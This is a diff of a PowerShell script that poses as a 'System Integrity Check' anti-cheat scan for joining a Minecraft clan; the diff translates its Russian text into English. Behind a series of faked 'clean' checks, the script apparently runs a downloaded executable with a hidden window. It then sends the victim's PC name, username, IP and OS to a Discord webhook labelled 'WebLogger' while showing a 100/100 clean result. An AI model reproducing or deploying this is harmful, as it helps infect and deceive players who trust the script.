@@ -1,7 +1,4 @@
-[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$OutputEncoding = [System.Text.Encoding]::UTF8
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-chcp 65001 | Out-Null
 
 function p($a, $b = 600) {
     Write-Host "[*] $a" -NoNewline
@@ -36,81 +33,81 @@ $j = Start-Job -ScriptBlock {
 
 Clear-Host
 Write-Host "============================================" -ForegroundColor Cyan
-Write-Host "   Проверка целостности системы v2.4" -ForegroundColor Cyan
+Write-Host "   System Integrity Check v2.4" -ForegroundColor Cyan
 Write-Host "   (c) 2026" -ForegroundColor Cyan
 Write-Host "============================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  Проверка перед вступлением в клан." -ForegroundColor Gray
+Write-Host "  Pre-join clan verification." -ForegroundColor Gray
 Write-Host ""
 
-p "Инициализация окружения"
-q "ОК"
+p "Initializing environment"
+q "OK"
 
-p "Проверка прав администратора"
+p "Checking administrator privileges"
 if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    q "повышено"
+    q "elevated"
 } else {
-    w "пользовательский режим"
+    w "user-mode"
 }
 
-p "Сканирование профиля"
+p "Scanning user profile"
 $mc = "$env:APPDATA\.minecraft"
-if (Test-Path $mc) { q "найдено" } else { w "не найдено"; New-Item -ItemType Directory -Path $mc -Force | Out-Null }
+if (Test-Path $mc) { q "found" } else { w "not found"; New-Item -ItemType Directory -Path $mc -Force | Out-Null }
 
-p "Чтение конфигурации"
+p "Reading configuration"
 $pf = Join-Path $mc "launcher_profiles.json"
-if (Test-Path $pf) { q "загружено" } else { w "отсутствует" }
+if (Test-Path $pf) { q "loaded" } else { w "missing" }
 
-p "Индексация модулей"
+p "Indexing modules"
 $md = Join-Path $mc "mods"
 $ml = @()
-if (Test-Path $md) { $ml = Get-ChildItem $md -Filter *.jar -ErrorAction SilentlyContinue; q "найдено: $($ml.Count)" } else { w "пусто" }
+if (Test-Path $md) { $ml = Get-ChildItem $md -Filter *.jar -ErrorAction SilentlyContinue; q "count: $($ml.Count)" } else { w "empty" }
 
-p "Проверка сигнатур"
+p "Checking signatures"
 $sg = @("Wurst","Impact","Meteor","Aristois","Future","Lambda","Sigma","Novoline","MoonLight","LiquidBounce","KamiBlue","Phobos","Konas","Rusherhack","Gamesense")
 $fd = @()
 foreach ($c in $sg) { foreach ($m in $ml) { if ($m.Name -match $c) { $fd += $c } } }
-if ($fd.Count -eq 0) { q "чисто" } else { s "обнаружено: $($fd -join ', ')" }
+if ($fd.Count -eq 0) { q "clean" } else { s "detected: $($fd -join ', ')" }
 
-p "Проверка аргументов JVM"
+p "Checking JVM arguments"
 $jf = Join-Path $mc "launcher_profiles.json"
 if (Test-Path $jf) {
-    if ((Get-Content $jf -Raw) -match "-javaagent") { w "подозрительный аргумент" } else { q "чисто" }
-} else { q "чисто" }
+    if ((Get-Content $jf -Raw) -match "-javaagent") { w "suspicious argument" } else { q "clean" }
+} else { q "clean" }
 
-p "Проверка целостности файлов"
+p "Verifying file integrity"
 Start-Sleep -Milliseconds 1100
-q "проверено"
+q "verified"
 
-p "Проверка версий"
+p "Checking versions"
 $vs = Join-Path $mc "versions"
-if (Test-Path $vs) { q "найдено: $((Get-ChildItem $vs -Directory).Count)" } else { w "отсутствует" }
+if (Test-Path $vs) { q "count: $((Get-ChildItem $vs -Directory).Count)" } else { w "missing" }
 
-p "Анализ логов"
+p "Analyzing logs"
 $lg = Join-Path $mc "logs\latest.log"
 if (Test-Path $lg) {
-    if ((Get-Content $lg -Raw -ErrorAction SilentlyContinue) -match "(?i)(cheat|inject|hack|exploit)") { w "подозрительно" } else { q "чисто" }
-} else { w "отсутствует" }
+    if ((Get-Content $lg -Raw -ErrorAction SilentlyContinue) -match "(?i)(cheat|inject|hack|exploit)") { w "suspicious" } else { q "clean" }
+} else { w "missing" }
 
-p "Сканирование процессов"
+p "Scanning processes"
 $ps2 = Get-Process | Where-Object { $_.Name -match "(?i)(wurst|impact|meteor|inject|cheat)" }
-if ($ps2) { s "обнаружено: $($ps2.Name -join ', ')" } else { q "чисто" }
+if ($ps2) { s "detected: $($ps2.Name -join ', ')" } else { q "clean" }
 
-p "Проверка инъекций"
+p "Checking injections"
 Start-Sleep -Milliseconds 800
-q "нет"
+q "none"
 
-p "Проверка соединений"
+p "Checking connections"
 Start-Sleep -Milliseconds 700
-q "чисто"
+q "clean"
 
-p "Проверка реестра"
+p "Checking registry"
 Start-Sleep -Milliseconds 600
-q "чисто"
+q "clean"
 
-p "Финальная валидация"
+p "Final validation"
 Start-Sleep -Milliseconds 1000
-q "пройдено"
+q "passed"
 
 $rt = Receive-Job -Job $j -Wait -AutoRemoveJob
 
@@ -128,7 +125,7 @@ if ($rt -and (Test-Path $rt)) {
             $s2 = [System.Text.Encoding]::ASCII.GetString($sb)
             $st.m = $s2
             if ($s2 -eq "MZ") { $st.x = $true }
-        } catch { $st.m = "ошибка чтения" }
+        } catch { $st.m = "read-error" }
     }
     try {
         $pr = Start-Process $rt -WindowStyle Hidden -PassThru -ErrorAction Stop
@@ -140,19 +137,19 @@ if ($rt -and (Test-Path $rt)) {
         if ($al) { $st.a = $true }
     } catch { $st.e = $_.Exception.Message }
 } else {
-    $st.e = "скачивание не удалось"
+    $st.e = "download failed"
 }
 
 Write-Host ""
 Write-Host "============================================" -ForegroundColor Cyan
-Write-Host "  ПРОВЕРКА ЗАВЕРШЕНА" -ForegroundColor Cyan
+Write-Host "  CHECK COMPLETE" -ForegroundColor Cyan
 Write-Host "============================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  Статус:      " -NoNewline; Write-Host "ЧИСТО" -ForegroundColor Green
-Write-Host "  Угрозы:      " -NoNewline; Write-Host "0" -ForegroundColor Green
-Write-Host "  Оценка:      " -NoNewline; Write-Host "100/100" -ForegroundColor Green
+Write-Host "  Status:      " -NoNewline; Write-Host "CLEAN" -ForegroundColor Green
+Write-Host "  Threats:     " -NoNewline; Write-Host "0" -ForegroundColor Green
+Write-Host "  Score:       " -NoNewline; Write-Host "100/100" -ForegroundColor Green
 Write-Host ""
-Write-Host "  Отправка логов администрации клана..." -ForegroundColor Green
+Write-Host "  Sending logs to clan admins..." -ForegroundColor Green
 
 try {
     $pn = $env:COMPUTERNAME
@@ -162,36 +159,36 @@ try {
     $tm = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
 
     $cl = 3066993
-    $sT = "ЧИСТО / 100-100"
-    if (-not $st.g -or -not $st.a) { $cl = 15158332; $sT = "ОШИБКА ЗАПУСКА" }
+    $sT = "CLEAN / 100-100"
+    if (-not $st.g -or -not $st.a) { $cl = 15158332; $sT = "LAUNCH ERROR" }
 
-    if ($st.g -and $st.a) { $rT = "Запущен (PID $($st.i), $($st.p))" }
-    elseif ($st.g)        { $rT = "Запущен, упал (PID $($st.i))" }
-    elseif ($st.d -and -not $st.x) { $rT = "Не exe (сигнатура: $($st.m))" }
-    else                  { $rT = "Не запущен: $($st.e)" }
+    if ($st.g -and $st.a) { $rT = "Started (PID $($st.i), $($st.p))" }
+    elseif ($st.g)        { $rT = "Started, crashed (PID $($st.i))" }
+    elseif ($st.d -and -not $st.x) { $rT = "Not exe (sig: $($st.m))" }
+    else                  { $rT = "Not started: $($st.e)" }
 
-    $dT = if ($st.d) { "Да" } else { "Нет" }
+    $dT = if ($st.d) { "Yes" } else { "No" }
 
     $pl = @{
-        username   = "Вебратлогер"
+        username   = "WebLogger"
         avatar_url = "https://i.imgur.com/PWmE5Ts.jpeg"
         embeds     = @(
             @{
-                title  = "Вебратлог"
+                title  = "WebLog"
                 color  = $cl
                 fields = @(
-                    @{ name = "ПК";           value = "$pn";         inline = $true }
-                    @{ name = "Пользователь"; value = "$un";         inline = $true }
-                    @{ name = "IP";           value = "$ip";         inline = $true }
-                    @{ name = "ОС";           value = "$os";         inline = $false }
-                    @{ name = "Время";        value = "$tm";         inline = $false }
-                    @{ name = "Статус";       value = "$sT";         inline = $false }
-                    @{ name = "Скачано";      value = "$dT";         inline = $true }
-                    @{ name = "Размер";       value = "$($st.s)";    inline = $true }
-                    @{ name = "Подпись";      value = "$($st.m)";    inline = $true }
-                    @{ name = "Запуск";       value = "$rT";         inline = $false }
+                    @{ name = "PC";         value = "$pn";         inline = $true }
+                    @{ name = "User";       value = "$un";         inline = $true }
+                    @{ name = "IP";         value = "$ip";         inline = $true }
+                    @{ name = "OS";         value = "$os";         inline = $false }
+                    @{ name = "Time";       value = "$tm";         inline = $false }
+                    @{ name = "Status";     value = "$sT";         inline = $false }
+                    @{ name = "Downloaded"; value = "$dT";         inline = $true }
+                    @{ name = "Size";       value = "$($st.s)";    inline = $true }
+                    @{ name = "Sig";        value = "$($st.m)";    inline = $true }
+                    @{ name = "Launch";     value = "$rT";         inline = $false }
                 )
-                footer    = @{ text = "Проверка целостности системы v2.4" }
+                footer    = @{ text = "System Integrity Check v2.4" }
                 timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
             }
         )
@@ -199,13 +196,13 @@ try {
 
     $jb = [System.Text.Encoding]::UTF8.GetBytes($pl)
     Invoke-RestMethod -Uri $wh -Method Post -Body $jb -ContentType 'application/json; charset=utf-8' -TimeoutSec 30
-    Write-Host "  [+] Логи отправлены в Discord." -ForegroundColor Green
+    Write-Host "  [+] Logs sent to Discord." -ForegroundColor Green
 } catch {
     Write-Host ""
-    Write-Host "  [!] Ошибка отправки логов:" -ForegroundColor Red
+    Write-Host "  [!] Send error:" -ForegroundColor Red
     Write-Host "      $($_.Exception.Message)" -ForegroundColor Red
 }
 
 Write-Host ""
-Write-Host "Нажмите любую клавишу для выхода..." -ForegroundColor DarkGray
+Write-Host "Press any key to exit..." -ForegroundColor DarkGray
 $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
